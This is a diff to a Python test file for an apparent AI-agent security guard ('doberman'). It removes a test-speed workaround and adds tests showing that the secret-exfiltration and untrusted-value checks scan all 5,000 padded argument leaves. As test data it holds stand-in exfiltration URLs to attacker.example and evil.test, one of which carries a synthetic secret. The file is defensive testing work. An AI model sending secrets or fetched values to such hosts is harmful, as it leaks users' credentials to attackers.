@@ -519,28 +519,19 @@ def test_echo_tripwire_fires_even_if_the_trusted_allowlist_is_unreadable(tmp_pat
 
 # --- final review, CRITICAL: an aggregate fingerprint cap so padded args -----
 # cannot defeat a match query by blowing SQLite's `IN (...)` variable limit.
-# Both padded-args tests monkeypatch the fingerprint key loader with an
-# lru_cache purely for TEST SPEED (production is unaffected — same
-# deterministic key either way): without it, tens of thousands of real
-# fingerprint() calls each re-read the local key file from disk (a pre-
-# existing, unrelated cost — see fingerprint.py's _load_or_create_key).
+# Both padded-args tests used to monkeypatch the fingerprint key loader with a
+# LOCAL lru_cache purely for test speed, working around a pre-existing,
+# unrelated cost: `_load_or_create_key` re-read the local key file from disk on
+# every fingerprint() call. That cost is now fixed in production itself
+# (storage.fingerprint._load_or_create_key is lru_cache(maxsize=1)'d — see
+# test_fingerprint.py's test_load_or_create_key_is_cached_across_many_
+# fingerprint_calls), so neither test below needs a local workaround any more.
+# The args walk itself stays UNCAPPED by design (raise-only forbids silently
+# walking a real secret/attacker value out of scan range) — see the
+# full-coverage tests below for the walk itself.
 
 
-def _cache_fingerprint_key(monkeypatch) -> None:
-    from functools import lru_cache
-
-    import doberman.storage.fingerprint as fingerprint_module
-
-    monkeypatch.setattr(
-        fingerprint_module,
-        "_load_or_create_key",
-        lru_cache(maxsize=1)(fingerprint_module._load_or_create_key),
-    )
-
-
-def test_padded_args_cannot_defeat_the_echo_tripwire_via_sqlite_variable_limit(
-    tmp_path, monkeypatch
-):
+def test_padded_args_cannot_defeat_the_echo_tripwire_via_sqlite_variable_limit(tmp_path):
     # A per-string extraction cap (provenance_values._MAX_VALUES == 200) still
     # multiplies unbounded across every string walked in the call's args: 300
     # padded strings x 200 host tokens each produces 60,002 candidate
@@ -551,8 +542,6 @@ def test_padded_args_cannot_defeat_the_echo_tripwire_via_sqlite_variable_limit(
     # around the real attacker destination. taint_floor._MAX_MATCH_FPS must
     # keep the destination's own fingerprint in the capped set regardless of
     # how much padding surrounds it.
-    _cache_fingerprint_key(monkeypatch)
-
     action = _action(external_destination=_UNTRUSTED_HOST_URL)
     decision = _pass_decision(action)
     from doberman.engine.rules.provenance_values import untrusted_value_fingerprints
@@ -573,7 +562,7 @@ def test_padded_args_cannot_defeat_the_echo_tripwire_via_sqlite_variable_limit(
     assert ReasonCode.untrusted_value_echo in out.reason_codes
 
 
-def test_padded_args_cannot_defeat_confirmed_exfil_via_sqlite_variable_limit(tmp_path, monkeypatch):
+def test_padded_args_cannot_defeat_confirmed_exfil_via_sqlite_variable_limit(tmp_path):
     # Secret-path sibling: _outbound_secret_fingerprints has the identical
     # unbounded-union shape (engine.rules.secrets.candidate_secret_fingerprints
     # caps at 16 tokens PER STRING). Enough padded strings still produce more
@@ -587,8 +576,6 @@ def test_padded_args_cannot_defeat_confirmed_exfil_via_sqlite_variable_limit(tmp
     # egress DESTINATION's query string (candidate_secret_fingerprints scans
     # query values specially), mirroring the untrusted-value test's shape:
     # the real value lives where the aggregate cap's dest-priority protects it.
-    _cache_fingerprint_key(monkeypatch)
-
     egress_url = f"https://attacker.example/collect?k={_SYNTHETIC_SECRET}"
     action = _action(external_destination=egress_url)
     decision = _pass_decision(action)
@@ -605,6 +592,72 @@ def test_padded_args_cannot_defeat_confirmed_exfil_via_sqlite_variable_limit(tmp
 
     out = apply_taint_floor(
         action, decision, "balanced", str(tmp_path), "sess-padded-secret", padded_args
+    )
+
+    assert out.final_verdict is Verdict.BLOCK
+    assert out.final_risk is Risk.critical
+    assert ReasonCode.confirmed_exfil in out.reason_codes
+
+
+# --- coordinator revision, IMPORTANT: the args WALK must stay UNCAPPED ------
+# (see taint_floor._walk_string_leaves's docstring). A leaf cap is a silent
+# raise-only violation: `_outbound_matches_recorded_secret`'s match is an
+# unconditional hard BLOCK (confirmed_exfil) in every mode, so a cap would let
+# an attacker pad enough leaves ahead of the real secret/attacker value to
+# walk it out of scan range and defeat that BLOCK. These two tests replace the
+# old "bounds extractor calls" pair (which asserted a call-count CEILING, the
+# opposite property): each puts the real value at the very LAST leaf of a
+# 5,000-leaf payload -- the worst case for anything that stops early -- and
+# confirms it still fires.
+
+
+def test_untrusted_value_walk_reaches_the_last_of_5000_leaves(tmp_path):
+    evil_url = "https://evil.test/collect"
+    asyncio.run(
+        record_output_taint(
+            f"see {evil_url} for the payload", str(tmp_path), "sess-last-leaf", tool_name="WebFetch"
+        )
+    )
+
+    # The attacker value is the LAST of 5,000 leaves, not the call's `dest`
+    # (a different, benign host below) -- a match here can only come from the
+    # args walk itself reaching the final leaf, not the dest-fingerprint
+    # shortcut (dict insertion order == walk order, so "last" really is last).
+    # Padding is host/URL/email-SHAPELESS on purpose: a host-shaped pad would
+    # itself add ~5,000 candidates to arg_fps and could crowd the real one out
+    # of the separate, pre-existing _MAX_MATCH_FPS union cap -- a different,
+    # already-covered concern (see the padded-args tests above, which rely on
+    # dest-priority for exactly this reason). This test isolates one thing:
+    # does the walk itself reach leaf 5000.
+    args = {f"pad{i}": f"just some ordinary padding value {i}" for i in range(4999)}
+    args["last"] = evil_url
+
+    action = _action(external_destination="benign-dest.example.net")
+    decision = _pass_decision(action)
+
+    out = apply_echo_tripwire(action, decision, "strict", str(tmp_path), "sess-last-leaf", args)
+
+    assert out.final_verdict is Verdict.AUTH
+    assert ReasonCode.untrusted_value_echo in out.reason_codes
+
+
+def test_secret_walk_reaches_the_last_of_5000_leaves(tmp_path):
+    # Sibling for the secret leg: the walk that feeds confirmed_exfil (an
+    # unconditional hard BLOCK in every mode) must never silently drop a leaf.
+    action = _action(external_destination="benign-dest.example.net")
+    decision = _pass_decision(action)
+    asyncio.run(record_taints(str(tmp_path), ["sess-last-leaf-secret"], [TAINT_SECRET_ACCESS]))
+    from doberman.engine.rules.secrets import candidate_secret_fingerprints
+    from doberman.storage.taint import record_secret_fingerprints
+
+    real_fps = list(candidate_secret_fingerprints(_SYNTHETIC_SECRET))
+    asyncio.run(record_secret_fingerprints(str(tmp_path), ["sess-last-leaf-secret"], real_fps))
+
+    args = {f"pad{i}": f"benign-value-{i}" for i in range(4999)}
+    args["last"] = _SYNTHETIC_SECRET
+
+    out = apply_taint_floor(
+        action, decision, "balanced", str(tmp_path), "sess-last-leaf-secret", args
     )
 
     assert out.final_verdict is Verdict.BLOCK
